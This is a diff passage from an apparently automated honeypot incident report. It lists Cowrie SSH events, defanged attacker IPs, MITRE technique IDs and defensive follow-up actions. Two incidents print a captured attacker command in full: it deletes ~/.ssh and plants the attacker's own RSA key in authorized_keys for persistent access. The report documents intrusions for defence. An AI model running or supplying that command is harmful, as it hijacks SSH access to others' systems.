+| `2026-05-01 19:57:55` | `cowrie.command.input` |
+| `2026-05-01 19:57:55` | `cowrie.command.input` |
+| `2026-05-01 19:57:55` | `cowrie.command.input` |
+| `2026-05-01 19:57:55` | `cowrie.command.input` |
+| `2026-05-01 19:57:55` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:56` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:57` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:58` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:57:59` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:00` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:01` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:02` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:03` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:04` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:05` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:06` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:07` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:08` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:09` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:10` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:11` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:12` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:13` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:14` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:15` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:16` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:17` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:18` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:19` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:20` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:21` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:22` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:23` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:24` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:25` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:26` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:27` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:28` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:29` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:30` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:31` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:32` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:33` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:34` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:35` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:36` | `cowrie.command.input` |
+| `2026-05-01 19:58:37` | `cowrie.command.input` |
+| `2026-05-01 19:58:37` | `cowrie.command.input` |
+| `2026-05-01 19:58:37` | `cowrie.command.input` |
+| `2026-05-01 19:58:37` | `cowrie.command.input` |
+| `2026-05-01 19:58:37` | `cowrie.command.input` |
+| `2026-05-01 19:58:38` | `cowrie.command.input` |
+| `2026-05-01 19:58:38` | `cowrie.command.input` |
+| `2026-05-01 19:58:38` | `cowrie.command.input` |
+| `2026-05-01 19:58:38` | `cowrie.command.input` |
+| `2026-05-01 19:58:38` | `cowrie.command.input` |
+| `2026-05-01 19:58:39` | `cowrie.command.input` |
+| `2026-05-01 19:58:39` | `cowrie.command.input` |
+| `2026-05-01 19:58:39` | `cowrie.command.input` |
+| `2026-05-01 19:58:39` | `cowrie.command.input` |
+| `2026-05-01 19:58:39` | `cowrie.command.input` |
+| `2026-05-01 19:58:40` | `cowrie.command.input` |
+| `2026-05-01 19:58:40` | `cowrie.command.input` |
+| `2026-05-01 19:58:40` | `cowrie.command.input` |
+| `2026-05-01 19:58:40` | `cowrie.command.input` |
+| `2026-05-01 19:58:41` | `cowrie.command.input` |
+| `2026-05-01 19:58:41` | `cowrie.command.input` |
+| `2026-05-01 19:58:41` | `cowrie.command.input` |
+| `2026-05-01 19:58:41` | `cowrie.command.input` |
+| `2026-05-01 19:58:41` | `cowrie.command.input` |
+| `2026-05-01 19:58:41` | `cowrie.command.input` |
+| `2026-05-01 19:58:42` | `cowrie.command.input` |
+| `2026-05-01 19:58:42` | `cowrie.command.input` |
+| `2026-05-01 19:58:42` | `cowrie.command.input` |
+| `2026-05-01 19:58:42` | `cowrie.command.input` |
+| `2026-05-01 19:58:43` | `cowrie.command.input` |
+| `2026-05-01 19:58:43` | `cowrie.command.input` |
+| `2026-05-01 19:58:43` | `cowrie.command.input` |
+| `2026-05-01 19:58:43` | `cowrie.command.input` |
+| `2026-05-01 19:58:43` | `cowrie.command.input` |
+| `2026-05-01 19:58:44` | `cowrie.command.input` |
+| `2026-05-01 19:58:44` | `cowrie.command.input` |
+| `2026-05-01 19:58:44` | `cowrie.command.input` |
+| `2026-05-01 19:58:44` | `cowrie.command.input` |
+| `2026-05-01 19:58:44` | `cowrie.command.input` |
+| `2026-05-01 19:58:45` | `cowrie.command.input` |
+| `2026-05-01 19:58:45` | `cowrie.command.input` |
+| `2026-05-01 19:58:45` | `cowrie.command.input` |
+| `2026-05-01 19:58:45` | `cowrie.command.input` |
+| `2026-05-01 19:58:46` | `cowrie.command.input` |
+| `2026-05-01 19:58:46` | `cowrie.command.input` |
+| `2026-05-01 19:58:46` | `cowrie.command.input` |
+| `2026-05-01 19:58:46` | `cowrie.command.input` |
+| `2026-05-01 19:58:47` | `cowrie.command.input` |
+| `2026-05-01 19:58:47` | `cowrie.command.input` |
+| `2026-05-01 19:58:47` | `cowrie.command.input` |
+| `2026-05-01 19:58:48` | `cowrie.command.input` |
+| `2026-05-01 19:58:48` | `cowrie.command.input` |
+| `2026-05-01 19:58:48` | `cowrie.command.input` |
+| `2026-05-01 19:58:48` | `cowrie.command.input` |
+| `2026-05-01 19:58:49` | `cowrie.command.input` |
+| `2026-05-01 19:58:49` | `cowrie.command.input` |
+| `2026-05-01 19:58:49` | `cowrie.command.input` |
+| `2026-05-01 19:58:50` | `cowrie.command.input` |
+| `2026-05-01 19:58:50` | `cowrie.command.input` |
+| `2026-05-01 19:58:50` | `cowrie.command.input` |
+| `2026-05-01 19:58:51` | `cowrie.command.input` |
+| `2026-05-01 19:58:51` | `cowrie.command.input` |
+| `2026-05-01 19:58:51` | `cowrie.command.input` |
+| `2026-05-01 19:58:51` | `cowrie.command.input` |
+| `2026-05-01 19:58:52` | `cowrie.command.input` |
+| `2026-05-01 19:58:52` | `cowrie.command.input` |
+| `2026-05-01 19:58:52` | `cowrie.command.input` |
+| `2026-05-01 19:58:53` | `cowrie.command.input` |
+| `2026-05-01 19:58:53` | `cowrie.command.input` |
+| `2026-05-01 19:58:53` | `cowrie.command.input` |
+| `2026-05-01 19:58:54` | `cowrie.command.input` |
+| `2026-05-01 19:58:54` | `cowrie.command.input` |
+| `2026-05-01 19:58:54` | `cowrie.command.input` |
+| `2026-05-01 19:58:54` | `cowrie.command.input` |
+| `2026-05-01 19:58:55` | `cowrie.command.input` |
+| `2026-05-01 19:58:55` | `cowrie.command.input` |
+| `2026-05-01 19:58:55` | `cowrie.command.input` |
+| `2026-05-01 19:58:56` | `cowrie.command.input` |
+| `2026-05-01 19:58:56` | `cowrie.command.input` |
+| `2026-05-01 19:58:56` | `cowrie.command.input` |
+| `2026-05-01 19:58:56` | `cowrie.command.input` |
+| `2026-05-01 19:58:57` | `cowrie.command.input` |
+| `2026-05-01 19:58:57` | `cowrie.command.input` |
+| `2026-05-01 19:58:57` | `cowrie.command.input` |
+| `2026-05-01 19:58:58` | `cowrie.command.input` |
+| `2026-05-01 19:58:58` | `cowrie.command.input` |
+| `2026-05-01 19:58:58` | `cowrie.command.input` |
+| `2026-05-01 19:58:58` | `cowrie.command.input` |
+| `2026-05-01 19:58:59` | `cowrie.command.input` |
+| `2026-05-01 19:58:59` | `cowrie.command.input` |
+| `2026-05-01 19:58:59` | `cowrie.command.input` |
+| `2026-05-01 19:59:00` | `cowrie.command.input` |
+| `2026-05-01 19:59:00` | `cowrie.command.input` |
+| `2026-05-01 19:59:00` | `cowrie.command.input` |
+| `2026-05-01 19:59:01` | `cowrie.command.input` |
+| `2026-05-01 19:59:01` | `cowrie.command.input` |
+| `2026-05-01 19:59:01` | `cowrie.command.input` |
+| `2026-05-01 19:59:01` | `cowrie.command.input` |
+| `2026-05-01 19:59:02` | `cowrie.command.input` |
+| `2026-05-01 19:59:02` | `cowrie.command.input` |
+| `2026-05-01 19:59:02` | `cowrie.command.input` |
+| `2026-05-01 19:59:03` | `cowrie.command.input` |
+| `2026-05-01 19:59:03` | `cowrie.command.input` |
+| `2026-05-01 19:59:03` | `cowrie.command.input` |
+| `2026-05-01 19:59:03` | `cowrie.command.input` |
+| `2026-05-01 19:59:04` | `cowrie.command.input` |
+| `2026-05-01 19:59:04` | `cowrie.command.input` |
+| `2026-05-01 19:59:04` | `cowrie.command.input` |
+| `2026-05-01 19:59:05` | `cowrie.command.input` |
+| `2026-05-01 19:59:05` | `cowrie.command.input` |
+| `2026-05-01 19:59:05` | `cowrie.command.input` |
+| `2026-05-01 19:59:06` | `cowrie.command.input` |
+| `2026-05-01 19:59:06` | `cowrie.command.input` |
+| `2026-05-01 19:59:06` | `cowrie.command.input` |
+| `2026-05-01 19:59:06` | `cowrie.command.input` |
+| `2026-05-01 19:59:07` | `cowrie.session.file_download` |
+| `2026-05-01 19:59:07` | `cowrie.log.closed` |
+| `2026-05-01 19:59:07` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `36.35.165[.]163` to AbuseIPDB if not already reported
+- [ ] Block `36.35.165[.]163` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-c466bf7f7354
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `43.154.195[.]142` |
+| **First Seen** | 2026-05-01 20:14 |
+| **Last Seen** | 2026-05-01 20:14 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:14:00` | `cowrie.session.connect` |
+| `2026-05-01 20:14:00` | `cowrie.client.version` |
+| `2026-05-01 20:14:00` | `cowrie.client.kex` |
+| `2026-05-01 20:14:01` | `cowrie.login.success` |
+| `2026-05-01 20:14:01` | `cowrie.session.params` |
+| `2026-05-01 20:14:01` | `cowrie.command.input` |
+| `2026-05-01 20:14:01` | `cowrie.command.failed` |
+| `2026-05-01 20:14:01` | `cowrie.log.closed` |
+| `2026-05-01 20:14:02` | `cowrie.session.params` |
+| `2026-05-01 20:14:02` | `cowrie.command.input` |
+| `2026-05-01 20:14:02` | `cowrie.session.file_download` |
+| `2026-05-01 20:14:02` | `cowrie.log.closed` |
+| `2026-05-01 20:14:05` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `43.154.195[.]142` to AbuseIPDB if not already reported
+- [ ] Block `43.154.195[.]142` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-92547e21ddc4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `43.154.195[.]142` |
+| **First Seen** | 2026-05-01 20:14 |
+| **Last Seen** | 2026-05-01 20:14 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:14:04` | `cowrie.session.connect` |
+| `2026-05-01 20:14:04` | `cowrie.client.version` |
+| `2026-05-01 20:14:04` | `cowrie.client.kex` |
+| `2026-05-01 20:14:05` | `cowrie.login.success` |
+| `2026-05-01 20:14:05` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `43.154.195[.]142` to AbuseIPDB if not already reported
+- [ ] Block `43.154.195[.]142` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-0a2f97af6f05
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `43.154.195[.]142` |
+| **First Seen** | 2026-05-01 20:20 |
+| **Last Seen** | 2026-05-01 20:21 |
+| **Session Duration** | 5s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
